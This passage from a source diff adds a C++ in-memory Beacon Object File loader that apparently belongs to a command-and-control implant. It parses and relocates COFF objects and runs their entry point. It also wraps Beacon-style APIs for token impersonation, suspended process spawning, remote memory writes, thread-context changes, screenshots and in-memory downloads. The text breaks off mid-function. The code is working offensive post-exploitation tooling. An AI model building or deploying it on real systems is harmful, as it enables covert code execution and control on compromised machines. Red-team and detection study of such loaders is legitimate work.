@@ -1,0 +1,1044 @@
+#include "bof_loader.h"
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdarg.h>
+#include <wchar.h>
+#include <vector>
+#include <string>
+
+#pragma comment(lib, "advapi32.lib")
+
+static const int CALLBACK_OUTPUT             = 0x00;
+static const int CALLBACK_ERROR              = 0x0d;
+static const int CALLBACK_OUTPUT_OEM         = 0x1e;
+static const int CALLBACK_OUTPUT_UTF8        = 0x20;
+static const int CALLBACK_AX_SCREENSHOT      = 0x81;
+static const int CALLBACK_AX_DOWNLOAD_MEM    = 0x82;
+
+static const int BOF_ERROR_PARSE             = 0x101;
+static const int BOF_ERROR_SYMBOL            = 0x102;
+static const int BOF_ERROR_MAX_FUNCS         = 0x103;
+static const int BOF_ERROR_ENTRY             = 0x104;
+static const int BOF_ERROR_ALLOC             = 0x105;
+
+static BofContext* gCurrentContext = NULL;
+static DATA_STORE_OBJECT gDataStore[64] = {};
+static void* gValueStoreKeys[64] = {};
+static void* gValueStoreValues[64] = {};
+static HANDLE gStopJobEvent = NULL;
+
+static ULONG Djb2A(const char* str)
+{
+    ULONG hash = 5381;
+    int c = 0;
+    while ((c = *str++) != 0) {
+        hash = ((hash << 5) + hash) + (unsigned char)c;
+    }
+    return hash;
+}
+
+static int BofAddMessageRaw(BofContext* ctx, int type, const BYTE* data, int dataLen)
+{
+    if (!ctx || !data || dataLen < 0) {
+        return 0;
+    }
+
+    if (ctx->msgCount >= ctx->msgCapacity) {
+        int newCapacity = ctx->msgCapacity == 0 ? 8 : ctx->msgCapacity * 2;
+        BofMsg* grown = (BofMsg*)realloc(ctx->msgs, sizeof(BofMsg) * newCapacity);
+        if (!grown) {
+            return 0;
+        }
+        memset(grown + ctx->msgCapacity, 0, sizeof(BofMsg) * (newCapacity - ctx->msgCapacity));
+        ctx->msgs = grown;
+        ctx->msgCapacity = newCapacity;
+    }
+
+    BYTE* copied = NULL;
+    if (dataLen > 0) {
+        copied = (BYTE*)malloc((size_t)dataLen);
+        if (!copied) {
+            return 0;
+        }
+        memcpy(copied, data, (size_t)dataLen);
+    }
+
+    ctx->msgs[ctx->msgCount].type = type;
+    ctx->msgs[ctx->msgCount].data = copied;
+    ctx->msgs[ctx->msgCount].dataLen = dataLen;
+    ctx->msgCount++;
+    return 1;
+}
+
+static int BofAddMessageText(BofContext* ctx, int type, const char* text)
+{
+    if (!text) {
+        text = "";
+    }
+    return BofAddMessageRaw(ctx, type, (const BYTE*)text, (int)strlen(text));
+}
+
+static BofContext* BofContextAlloc(void)
+{
+    BofContext* ctx = (BofContext*)calloc(1, sizeof(BofContext));
+    return ctx;
+}
+
+void BofContextFree(BofContext* ctx)
+{
+    if (!ctx) {
+        return;
+    }
+    for (int i = 0; i < ctx->msgCount; ++i) {
+        free(ctx->msgs[i].data);
+    }
+    free(ctx->msgs);
+    free(ctx);
+}
+
+static DWORD SectionProtect(const COF_SECTION* section)
+{
+    const bool executable = (section->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
+    const bool readable = (section->Characteristics & IMAGE_SCN_MEM_READ) != 0;
+    const bool writable = (section->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
+
+    if (executable && writable) return PAGE_EXECUTE_READWRITE;
+    if (executable && readable) return PAGE_EXECUTE_READ;
+    if (executable) return PAGE_EXECUTE;
+    if (writable) return PAGE_READWRITE;
+    if (readable) return PAGE_READONLY;
+    return PAGE_NOACCESS;
+}
+
+static char* SymbolName(const COF_SYMBOL* symbol, char* stringTable)
+{
+    if (symbol->Name.dwName[0] == 0) {
+        return stringTable + symbol->Name.dwName[1];
+    }
+    return (char*)symbol->Name.cName;
+}
+
+static void TrimLeadingUnderscores(const char** value)
+{
+    while (value && *value && (**value == '_' || **value == '@')) {
+        (*value)++;
+    }
+}
+
+static FARPROC ResolveExternalSymbol(const char* symbolName)
+{
+    if (!symbolName || !*symbolName) {
+        return NULL;
+    }
+
+    struct ApiEntry {
+        const char* name;
+        FARPROC proc;
+    };
+
+    static const ApiEntry apiTable[] = {
+        { "BeaconDataParse", (FARPROC)BeaconDataParse },
+        { "BeaconDataInt", (FARPROC)BeaconDataInt },
+        { "BeaconDataShort", (FARPROC)BeaconDataShort },
+        { "BeaconDataLength", (FARPROC)BeaconDataLength },
+        { "BeaconDataExtract", (FARPROC)BeaconDataExtract },
+        { "BeaconDataPtr", (FARPROC)BeaconDataPtr },
+        { "BeaconOutput", (FARPROC)BeaconOutput },
+        { "BeaconPrintf", (FARPROC)BeaconPrintf },
+        { "BeaconFormatAlloc", (FARPROC)BeaconFormatAlloc },
+        { "BeaconFormatReset", (FARPROC)BeaconFormatReset },
+        { "BeaconFormatAppend", (FARPROC)BeaconFormatAppend },
+        { "BeaconFormatPrintf", (FARPROC)BeaconFormatPrintf },
+        { "BeaconFormatToString", (FARPROC)BeaconFormatToString },
+        { "BeaconFormatFree", (FARPROC)BeaconFormatFree },
+        { "BeaconFormatInt", (FARPROC)BeaconFormatInt },
+        { "BeaconUseToken", (FARPROC)BeaconUseToken },
+        { "BeaconRevertToken", (FARPROC)BeaconRevertToken },
+        { "BeaconIsAdmin", (FARPROC)BeaconIsAdmin },
+        { "toWideChar", (FARPROC)toWideChar },
+        { "BeaconAddValue", (FARPROC)BeaconAddValue },
+        { "BeaconGetValue", (FARPROC)BeaconGetValue },
+        { "BeaconRemoveValue", (FARPROC)BeaconRemoveValue },
+        { "BeaconGetSpawnTo", (FARPROC)BeaconGetSpawnTo },
+        { "BeaconSpawnTemporaryProcess", (FARPROC)BeaconSpawnTemporaryProcess },
+        { "BeaconInjectProcess", (FARPROC)BeaconInjectProcess },
+        { "BeaconInjectTemporaryProcess", (FARPROC)BeaconInjectTemporaryProcess },
+        { "BeaconCleanupProcess", (FARPROC)BeaconCleanupProcess },
+        { "BeaconVirtualAlloc", (FARPROC)BeaconVirtualAlloc },
+        { "BeaconVirtualAllocEx", (FARPROC)BeaconVirtualAllocEx },
+        { "BeaconVirtualProtect", (FARPROC)BeaconVirtualProtect },
+        { "BeaconVirtualProtectEx", (FARPROC)BeaconVirtualProtectEx },
+        { "BeaconVirtualFree", (FARPROC)BeaconVirtualFree },
+        { "BeaconGetThreadContext", (FARPROC)BeaconGetThreadContext },
+        { "BeaconSetThreadContext", (FARPROC)BeaconSetThreadContext },
+        { "BeaconResumeThread", (FARPROC)BeaconResumeThread },
+        { "BeaconOpenProcess", (FARPROC)BeaconOpenProcess },
+        { "BeaconOpenThread", (FARPROC)BeaconOpenThread },
+        { "BeaconCloseHandle", (FARPROC)BeaconCloseHandle },
+        { "BeaconUnmapViewOfFile", (FARPROC)BeaconUnmapViewOfFile },
+        { "BeaconVirtualQuery", (FARPROC)BeaconVirtualQuery },
+        { "BeaconDuplicateHandle", (FARPROC)BeaconDuplicateHandle },
+        { "BeaconReadProcessMemory", (FARPROC)BeaconReadProcessMemory },
+        { "BeaconWriteProcessMemory", (FARPROC)BeaconWriteProcessMemory },
+        { "BeaconInformation", (FARPROC)BeaconInformation },
+        { "BeaconGetOutputData", (FARPROC)BeaconGetOutputData },
+        { "BeaconDownload", (FARPROC)BeaconDownload },
+        { "BeaconGetSyscallInformation", (FARPROC)BeaconGetSyscallInformation },
+        { "swap_endianess", (FARPROC)swap_endianess },
+        { "BeaconDataStoreGetItem", (FARPROC)BeaconDataStoreGetItem },
+        { "BeaconDataStoreProtectItem", (FARPROC)BeaconDataStoreProtectItem },
+        { "BeaconDataStoreUnprotectItem", (FARPROC)BeaconDataStoreUnprotectItem },
+        { "BeaconDataStoreMaxEntries", (FARPROC)BeaconDataStoreMaxEntries },
+        { "BeaconGetCustomUserData", (FARPROC)BeaconGetCustomUserData },
+        { "BeaconDisableBeaconGate", (FARPROC)BeaconDisableBeaconGate },
+        { "BeaconEnableBeaconGate", (FARPROC)BeaconEnableBeaconGate },
+        { "BeaconDisableBeaconGateMasking", (FARPROC)BeaconDisableBeaconGateMasking },
+        { "BeaconEnableBeaconGateMasking", (FARPROC)BeaconEnableBeaconGateMasking },
+        { "AxAddScreenshot", (FARPROC)AxAddScreenshot },
+        { "AxDownloadMemory", (FARPROC)AxDownloadMemory },
+        { "BeaconRegisterThreadCallback", (FARPROC)BeaconRegisterThreadCallback },
+        { "BeaconUnregisterThreadCallback", (FARPROC)BeaconUnregisterThreadCallback },
+        { "BeaconWakeup", (FARPROC)BeaconWakeup },
+        { "BeaconGetStopJobEvent", (FARPROC)BeaconGetStopJobEvent },
+    };
+
+    const char* cursor = symbolName;
+    TrimLeadingUnderscores(&cursor);
+    if (_strnicmp(cursor, "imp_", 4) == 0) {
+        cursor += 4;
+    }
+
+    for (size_t i = 0; i < sizeof(apiTable) / sizeof(apiTable[0]); ++i) {
+        if (_stricmp(cursor, apiTable[i].name) == 0) {
+            return apiTable[i].proc;
+        }
+    }
+
+    std::string moduleName;
+    std::string functionName;
+    const char* dollar = strchr(cursor, '$');
+    if (dollar) {
+        moduleName.assign(cursor, dollar - cursor);
+        functionName.assign(dollar + 1);
+    } else {
+        moduleName = "kernel32";
+        functionName = cursor;
+    }
+
+    if (moduleName.empty() || functionName.empty()) {
+        return NULL;
+    }
+
+    if (moduleName.find('.') == std::string::npos) {
+        moduleName += ".dll";
+    }
+
+    HMODULE library = LoadLibraryA(moduleName.c_str());
+    if (!library) {
+        return NULL;
+    }
+
+    if (!functionName.empty() && functionName[0] == '#') {
+        return GetProcAddress(library, (LPCSTR)(ULONG_PTR)atoi(functionName.c_str() + 1));
+    }
+    return GetProcAddress(library, functionName.c_str());
+}
+
+static int ApplyRelocations(
+    BofContext* ctx,
+    unsigned char* coffFile,
+    COF_HEADER* header,
+    COF_SECTION* sections,
+    unsigned char** mappedSections,
+    char* stringTable)
+{
+    COF_SYMBOL* symbols = (COF_SYMBOL*)(coffFile + header->PointerToSymbolTable);
+
+    for (int i = 0; i < header->NumberOfSections; ++i) {
+        COF_SECTION* section = &sections[i];
+        if (section->NumberOfRelocations == 0) {
+            continue;
+        }
+
+        COF_RELOCATION* relocations = (COF_RELOCATION*)(coffFile + section->PointerToRelocations);
+        for (int r = 0; r < section->NumberOfRelocations; ++r) {
+            COF_RELOCATION* relocation = &relocations[r];
+            if (relocation->SymbolTableIndex >= header->NumberOfSymbols) {
+                BofAddMessageText(ctx, BOF_ERROR_PARSE, "BOF relocation references invalid symbol index");
+                return 0;
+            }
+
+            COF_SYMBOL* symbol = &symbols[relocation->SymbolTableIndex];
+            unsigned char* target = mappedSections[i] + relocation->VirtualAddress;
+            ULONG_PTR resolved = 0;
+
+            if (symbol->SectionNumber > 0) {
+                int sectionIndex = symbol->SectionNumber - 1;
+                if (sectionIndex < 0 || sectionIndex >= header->NumberOfSections || !mappedSections[sectionIndex]) {
+                    BofAddMessageText(ctx, BOF_ERROR_PARSE, "BOF relocation references unmapped section");
+                    return 0;
+                }
+                resolved = (ULONG_PTR)(mappedSections[sectionIndex] + symbol->Value);
+            } else {
+                char* symbolName = SymbolName(symbol, stringTable);
+                FARPROC proc = ResolveExternalSymbol(symbolName);
+                if (!proc) {
+                    std::string message = "BOF unresolved symbol: ";
+                    message += symbolName ? symbolName : "<null>";
+                    BofAddMessageText(ctx, BOF_ERROR_SYMBOL, message.c_str());
+                    return 0;
+                }
+                resolved = (ULONG_PTR)proc;
+            }
+
+            switch (relocation->Type) {
+            case IMAGE_REL_AMD64_ADDR64:
+                *(ULONG_PTR*)target = resolved;
+                break;
+            case IMAGE_REL_AMD64_ADDR32NB:
+                *(DWORD*)target = (DWORD)(resolved - (ULONG_PTR)mappedSections[0]);
+                break;
+            case IMAGE_REL_AMD64_REL32:
+                *(DWORD*)target = (DWORD)(resolved - ((ULONG_PTR)target + 4));
+                break;
+            case IMAGE_REL_AMD64_REL32_1:
+                *(DWORD*)target = (DWORD)(resolved - ((ULONG_PTR)target + 5));
+                break;
+            case IMAGE_REL_AMD64_REL32_2:
+                *(DWORD*)target = (DWORD)(resolved - ((ULONG_PTR)target + 6));
+                break;
+            case IMAGE_REL_AMD64_REL32_3:
+                *(DWORD*)target = (DWORD)(resolved - ((ULONG_PTR)target + 7));
+                break;
+            case IMAGE_REL_AMD64_REL32_4:
+                *(DWORD*)target = (DWORD)(resolved - ((ULONG_PTR)target + 8));
+                break;
+            case IMAGE_REL_AMD64_REL32_5:
+                *(DWORD*)target = (DWORD)(resolved - ((ULONG_PTR)target + 9));
+                break;
+            default: {
+                char buffer[96] = {0};
+                _snprintf_s(buffer, sizeof(buffer), _TRUNCATE, "Unsupported BOF relocation type: 0x%04x", relocation->Type);
+                BofAddMessageText(ctx, BOF_ERROR_PARSE, buffer);
+                return 0;
+            }
+            }
+        }
+    }
+
+    return 1;
+}
+
+static FARPROC FindEntryPoint(
+    unsigned char* coffFile,
+    COF_HEADER* header,
+    COF_SYMBOL* symbols,
+    char* stringTable,
+    unsigned char** mappedSections,
+    const char* entryName)
+{
+    for (int i = 0; i < header->NumberOfSymbols; ++i) {
+        COF_SYMBOL* symbol = &symbols[i];
+        char* name = SymbolName(symbol, stringTable);
+        if (!name || symbol->SectionNumber <= 0) {
+            i += symbol->NumberOfAuxSymbols;
+            continue;
+        }
+
+        const char* normalized = name;
+        TrimLeadingUnderscores(&normalized);
+        if (_stricmp(normalized, entryName) == 0) {
+            int sectionIndex = symbol->SectionNumber - 1;
+            if (sectionIndex >= 0 && sectionIndex < header->NumberOfSections && mappedSections[sectionIndex]) {
+                return (FARPROC)(mappedSections[sectionIndex] + symbol->Value);
+            }
+        }
+
+        i += symbol->NumberOfAuxSymbols;
+    }
+
+    return NULL;
+}
+
+BofContext* ObjectExecute(
+    unsigned char* coffFile, unsigned int coffFileSize,
+    unsigned char* args, int argsSize)
+{
+    BofContext* ctx = BofContextAlloc();
+    if (!ctx) {
+        return NULL;
+    }
+
+    if (!coffFile || coffFileSize < sizeof(COF_HEADER)) {
+        BofAddMessageText(ctx, BOF_ERROR_PARSE, "BOF payload is empty or truncated");
+        return ctx;
+    }
+
+    COF_HEADER* header = (COF_HEADER*)coffFile;
+    if (header->Machine != IMAGE_FILE_MACHINE_AMD64) {
+        BofAddMessageText(ctx, BOF_ERROR_PARSE, "Only x64 BOFs are supported by this template");
+        return ctx;
+    }
+    if (header->NumberOfSections <= 0 || header->NumberOfSections > MAX_BOF_SECTIONS) {
+        BofAddMessageText(ctx, BOF_ERROR_MAX_FUNCS, "BOF section count exceeds template limits");
+        return ctx;
+    }
+    if (header->PointerToSymbolTable <= 0 || (unsigned int)header->PointerToSymbolTable >= coffFileSize) {
+        BofAddMessageText(ctx, BOF_ERROR_PARSE, "BOF symbol table pointer is invalid");
+        return ctx;
+    }
+
+    COF_SECTION* sections = (COF_SECTION*)(coffFile + sizeof(COF_HEADER) + header->SizeOfOptionalHeader);
+    COF_SYMBOL* symbols = (COF_SYMBOL*)(coffFile + header->PointerToSymbolTable);
+    char* stringTable = (char*)(symbols + header->NumberOfSymbols);
+    FARPROC entry = NULL;
+
+    unsigned char* mappedSections[MAX_BOF_SECTIONS] = {};
+    DWORD oldProtect[MAX_BOF_SECTIONS] = {};
+
+    for (int i = 0; i < header->NumberOfSections; ++i) {
+        COF_SECTION* section = &sections[i];
+        SIZE_T size = (SIZE_T)(section->VirtualSize > 0 ? section->VirtualSize : section->SizeOfRawData);
+        if (size == 0) {
+            continue;
+        }
+
+        mappedSections[i] = (unsigned char*)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!mappedSections[i]) {
+            BofAddMessageText(ctx, BOF_ERROR_ALLOC, "VirtualAlloc failed while mapping BOF sections");
+            goto cleanup;
+        }
+
+        if (section->SizeOfRawData > 0) {
+            if ((unsigned int)(section->PointerToRawData + section->SizeOfRawData) > coffFileSize) {
+                BofAddMessageText(ctx, BOF_ERROR_PARSE, "BOF section raw data is truncated");
+                goto cleanup;
+            }
+            memcpy(mappedSections[i], coffFile + section->PointerToRawData, section->SizeOfRawData);
+        }
+        if (size > (SIZE_T)section->SizeOfRawData) {
+            memset(mappedSections[i] + section->SizeOfRawData, 0, size - section->SizeOfRawData);
+        }
+    }
+
+    if (!ApplyRelocations(ctx, coffFile, header, sections, mappedSections, stringTable)) {
+        goto cleanup;
+    }
+
+    entry = FindEntryPoint(coffFile, header, symbols, stringTable, mappedSections, "go");
+    if (!entry) {
+        BofAddMessageText(ctx, BOF_ERROR_ENTRY, "BOF entry point 'go' was not found");
+        goto cleanup;
+    }
+
+    for (int i = 0; i < header->NumberOfSections; ++i) {
+        if (!mappedSections[i]) {
+            continue;
+        }
+        SIZE_T size = (SIZE_T)(sections[i].VirtualSize > 0 ? sections[i].VirtualSize : sections[i].SizeOfRawData);
+        DWORD desiredProtect = SectionProtect(&sections[i]);
+        VirtualProtect(mappedSections[i], size, desiredProtect, &oldProtect[i]);
+    }
+
+    gCurrentContext = ctx;
+    typedef void (*BofEntry)(char*, int);
+    ((BofEntry)entry)((char*)args, argsSize);
+    gCurrentContext = NULL;
+
+cleanup:
+    gCurrentContext = NULL;
+    for (int i = 0; i < header->NumberOfSections && i < MAX_BOF_SECTIONS; ++i) {
+        if (mappedSections[i]) {
+            VirtualFree(mappedSections[i], 0, MEM_RELEASE);
+        }
+    }
+    return ctx;
+}
+
+BofContext* ObjectExecuteAsync(
+    unsigned char* coffFile, unsigned int coffFileSize,
+    unsigned char* args, int argsSize)
+{
+    return ObjectExecute(coffFile, coffFileSize, args, argsSize);
+}
+
+static void EnsureParser(datap* parser)
+{
+    if (!parser || !parser->buffer) {
+        return;
+    }
+    if (parser->length < 0) {
+        parser->length = 0;
+    }
+}
+
+void BeaconDataParse(datap* parser, char* buffer, int size)
+{
+    if (!parser) {
+        return;
+    }
+    parser->original = buffer;
+    parser->buffer = buffer;
+    parser->length = size;
+    parser->size = size;
+}
+
+int BeaconDataInt(datap* parser)
+{
+    EnsureParser(parser);
+    if (!parser || parser->length < 4) {
+        return 0;
+    }
+    int value = ntohl(*(u_long*)parser->buffer);
+    parser->buffer += 4;
+    parser->length -= 4;
+    return value;
+}
+
+short BeaconDataShort(datap* parser)
+{
+    EnsureParser(parser);
+    if (!parser || parser->length < 2) {
+        return 0;
+    }
+    short value = ntohs(*(u_short*)parser->buffer);
+    parser->buffer += 2;
+    parser->length -= 2;
+    return value;
+}
+
+int BeaconDataLength(datap* parser)
+{
+    return parser ? parser->length : 0;
+}
+
+char* BeaconDataExtract(datap* parser, int* size)
+{
+    EnsureParser(parser);
+    if (!parser || parser->length < 4) {
+        if (size) *size = 0;
+        return NULL;
+    }
+    int length = BeaconDataInt(parser);
+    if (length < 0 || parser->length < length) {
+        if (size) *size = 0;
+        return NULL;
+    }
+    char* result = parser->buffer;
+    parser->buffer += length;
+    parser->length -= length;
+    if (size) *size = length;
+    return result;
+}
+
+char* BeaconDataPtr(datap* parser, int size)
+{
+    EnsureParser(parser);
+    if (!parser || size < 0 || parser->length < size) {
+        return NULL;
+    }
+    char* result = parser->buffer;
+    parser->buffer += size;
+    parser->length -= size;
+    return result;
+}
+
+void BeaconOutput(int type, char* data, int len)
+{
+    if (!gCurrentContext) {
+        return;
+    }
+    if (!data) {
+        data = (char*)"";
+        len = 0;
+    }
+    if (len < 0) {
+        len = (int)strlen(data);
+    }
+    BofAddMessageRaw(gCurrentContext, type, (BYTE*)data, len);
+}
+
+void BeaconPrintf(int type, char* fmt, ...)
+{
+    char buffer[4096] = {0};
+    va_list args;
+    va_start(args, fmt);
+    _vsnprintf_s(buffer, sizeof(buffer), _TRUNCATE, fmt, args);
+    va_end(args);
+    BeaconOutput(type, buffer, (int)strlen(buffer));
+}
+
+void BeaconFormatAlloc(formatp* format, int maxsz)
+{
+    if (!format || maxsz <= 0) {
+        return;
+    }
+    format->original = (char*)calloc(1, (size_t)maxsz);
+    format->buffer = format->original;
+    format->size = maxsz;
+    format->length = 0;
+}
+
+void BeaconFormatReset(formatp* format)
+{
+    if (!format || !format->original) {
+        return;
+    }
+    memset(format->original, 0, (size_t)format->size);
+    format->buffer = format->original;
+    format->length = 0;
+}
+
+void BeaconFormatAppend(formatp* format, char* text, int len)
+{
+    if (!format || !format->original || !text || len <= 0) {
+        return;
+    }
+    int remaining = format->size - format->length;
+    if (remaining <= 0) {
+        return;
+    }
+    int toCopy = len < remaining ? len : remaining;
+    memcpy(format->buffer, text, (size_t)toCopy);
+    format->buffer += toCopy;
+    format->length += toCopy;
+}
+
+void BeaconFormatPrintf(formatp* format, char* fmt, ...)
+{
+    if (!format || !format->original || !fmt) {
+        return;
+    }
+    char buffer[2048] = {0};
+    va_list args;
+    va_start(args, fmt);
+    _vsnprintf_s(buffer, sizeof(buffer), _TRUNCATE, fmt, args);
+    va_end(args);
+    BeaconFormatAppend(format, buffer, (int)strlen(buffer));
+}
+
+char* BeaconFormatToString(formatp* format, int* size)
+{
+    if (!format) {
+        if (size) *size = 0;
+        return NULL;
+    }
+    if (size) *size = format->length;
+    return format->original;
+}
+
+void BeaconFormatFree(formatp* format)
+{
+    if (!format) {
+        return;
+    }
+    free(format->original);
+    memset(format, 0, sizeof(*format));
+}
+
+void BeaconFormatInt(formatp* format, int value)
+{
+    int be = htonl(value);
+    BeaconFormatAppend(format, (char*)&be, sizeof(be));
+}
+
+BOOL BeaconUseToken(HANDLE token)
+{
+    return ImpersonateLoggedOnUser(token);
+}
+
+void BeaconRevertToken()
+{
+    RevertToSelf();
+}
+
+BOOL BeaconIsAdmin()
+{
+    BOOL isAdmin = FALSE;
+    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
+    PSID adminGroup = NULL;
+    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
+                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
+        CheckTokenMembership(NULL, adminGroup, &isAdmin);
+        FreeSid(adminGroup);
+    }
+    return isAdmin;
+}
+
+BOOL toWideChar(char* src, wchar_t* dst, int max)
+{
+    if (!src || !dst || max <= 0) {
+        return FALSE;
+    }
+    return MultiByteToWideChar(CP_UTF8, 0, src, -1, dst, max) > 0;
+}
+
+void BeaconAddValue(const char* key, void* value)
+{
+    if (!key) {
+        return;
+    }
+    for (int i = 0; i < 64; ++i) {
+        if (!gValueStoreKeys[i]) {
+            size_t len = strlen(key) + 1;
+            char* copy = (char*)malloc(len);
+            if (!copy) {
+                return;
+            }
+            memcpy(copy, key, len);
+            gValueStoreKeys[i] = copy;
+            gValueStoreValues[i] = value;
+            return;
+        }
+        if (_stricmp((const char*)gValueStoreKeys[i], key) == 0) {
+            gValueStoreValues[i] = value;
+            return;
+        }
+    }
+}
+
+void* BeaconGetValue(const char* key)
+{
+    if (!key) {
+        return NULL;
+    }
+    for (int i = 0; i < 64; ++i) {
+        if (gValueStoreKeys[i] && _stricmp((const char*)gValueStoreKeys[i], key) == 0) {
+            return gValueStoreValues[i];
+        }
+    }
+    return NULL;
+}
+
+BOOL BeaconRemoveValue(const char* key)
+{
+    if (!key) {
+        return FALSE;
+    }
+    for (int i = 0; i < 64; ++i) {
+        if (gValueStoreKeys[i] && _stricmp((const char*)gValueStoreKeys[i], key) == 0) {
+            free(gValueStoreKeys[i]);
+            gValueStoreKeys[i] = NULL;
+            gValueStoreValues[i] = NULL;
+            return TRUE;
+        }
+    }
+    return FALSE;
+}
+
+BOOL BeaconGetSpawnTo(BOOL, char* buffer, int length)
+{
+    if (!buffer || length <= 0) {
+        return FALSE;
+    }
+    return GetEnvironmentVariableA("COMSPEC", buffer, (DWORD)length) > 0;
+}
+
+BOOL BeaconSpawnTemporaryProcess(BOOL, BOOL, STARTUPINFOA* sInfo, PROCESS_INFORMATION* pInfo)
+{
+    char comspec[MAX_PATH] = {0};
+    if (!BeaconGetSpawnTo(FALSE, comspec, MAX_PATH)) {
+        strcpy_s(comspec, "C:\\Windows\\System32\\cmd.exe");
+    }
+    return CreateProcessA(comspec, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, sInfo, pInfo);
+}
+
+void BeaconInjectProcess(HANDLE, int, char*, int, int, char*, int) {}
+void BeaconInjectTemporaryProcess(PROCESS_INFORMATION*, char*, int, int, char*, int) {}
+void BeaconCleanupProcess(PROCESS_INFORMATION* pInfo)
+{
+    if (!pInfo) {
+        return;
+    }
+    if (pInfo->hThread) CloseHandle(pInfo->hThread);
+    if (pInfo->hProcess) CloseHandle(pInfo->hProcess);
+    memset(pInfo, 0, sizeof(*pInfo));
+}
+
+LPVOID BeaconVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
+{
+    return VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
+}
+
+LPVOID BeaconVirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
+{
+    return VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
+}
+
+BOOL BeaconVirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)
+{
+    return VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect);
+}
+
+BOOL BeaconVirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)
+{
+    return VirtualProtectEx(hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect);
+}
+
+BOOL BeaconVirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)
+{
+    return VirtualFree(lpAddress, dwSize, dwFreeType);
+}
+
+BOOL BeaconGetThreadContext(HANDLE hThread, LPCONTEXT lpContext)
+{
+    return GetThreadContext(hThread, lpContext);
+}
+
+BOOL BeaconSetThreadContext(HANDLE hThread, LPCONTEXT lpContext)
+{
+    return SetThreadContext(hThread, lpContext);
+}
+
+DWORD BeaconResumeThread(HANDLE hThread)
+{
+    return ResumeThread(hThread);
+}
+
+HANDLE BeaconOpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)
+{
+    return OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
+}
+
+HANDLE BeaconOpenThread(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId)
+{
+    return OpenThread(dwDesiredAccess, bInheritHandle, dwThreadId);
+}
+
+BOOL BeaconCloseHandle(HANDLE hObject)
+{
+    return CloseHandle(hObject);
+}
+
+BOOL BeaconUnmapViewOfFile(LPCVOID lpBaseAddress)
+{
+    return UnmapViewOfFile(lpBaseAddress);
+}
+
+SIZE_T BeaconVirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength)
+{
+    return VirtualQuery(lpAddress, lpBuffer, dwLength);
+}
+
+BOOL BeaconDuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions)
+{
+    return DuplicateHandle(hSourceProcessHandle, hSourceHandle, hTargetProcessHandle, lpTargetHandle, dwDesiredAccess, bInheritHandle, dwOptions);
+}
+
+BOOL BeaconReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead)
+{
+    return ReadProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
+}
+
+BOOL BeaconWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten)
+{
+    return WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
+}
+
+BOOL BeaconInformation(BEACON_INFO* info)
+{
+    if (!info) {
+        return FALSE;
+    }
+    memset(info, 0, sizeof(*info));
+    info->version = 1;
+    return TRUE;
+}
+
+char* BeaconGetOutputData(int* size)
+{
+    if (size) {
+        *size = 0;
+    }
+    return NULL;
+}
+
+void BeaconDownload(const char* filename, const char* buffer, unsigned int length)
+{
+    AxDownloadMemory((char*)(filename ? filename : "memory.bin"), (char*)(buffer ? buffer : ""), (int)length);
+}
+
+BOOL BeaconGetSyscallInformation(PBEACON_SYSCALLS info, BOOL)
+{
+    if (!info) {
+        return FALSE;
+    }
+    memset(info, 0, sizeof(*info));
+    info->version = 1;
+    return TRUE;
+}
+
+unsigned int swap_endianess(unsigned int indata)
+{
+    return _byteswap_ulong(indata);
+}
+
+PDATA_STORE_OBJECT BeaconDataStoreGetItem(SIZE_T index)
+{
+    if (index >= 64) {
+        return NULL;
+    }
+    return &gDataStore[index];
+}
+
+void BeaconDataStoreProtectItem(SIZE_T) {}
+void BeaconDataStoreUnprotectItem(SIZE_T) {}
+ULONG BeaconDataStoreMaxEntries()
+{
+    return 64;
+}
+char* BeaconGetCustomUserData()
+{
+    return NULL;
+}
+
+void BeaconDisableBeaconGate() {}
+void BeaconEnableBeaconGate() {}
+void BeaconDisableBeaconGateMasking() {}
+void BeaconEnableBeaconGateMasking() {}
+
+void AxAddScreenshot(char* note, char* data, int len)
+{
+    if (!gCurrentContext || !data || len <= 0) {
+        return;
+    }
+    std::vector<BYTE> blob;
+    int noteLen = note ? (int)strlen(note) : 0;
+    DWORD beNote = htonl(noteLen);
+    blob.insert(blob.end(), (BYTE*)&beNote, (BYTE*)&beNote + sizeof(beNote));
+    if (noteLen > 0) {
+        blob.insert(blob.end(), (BYTE*)note, (BYTE*)note + noteLen);
+    }
+    blob.insert(blob.end(), (BYTE*)data, (BYTE*)data + len);
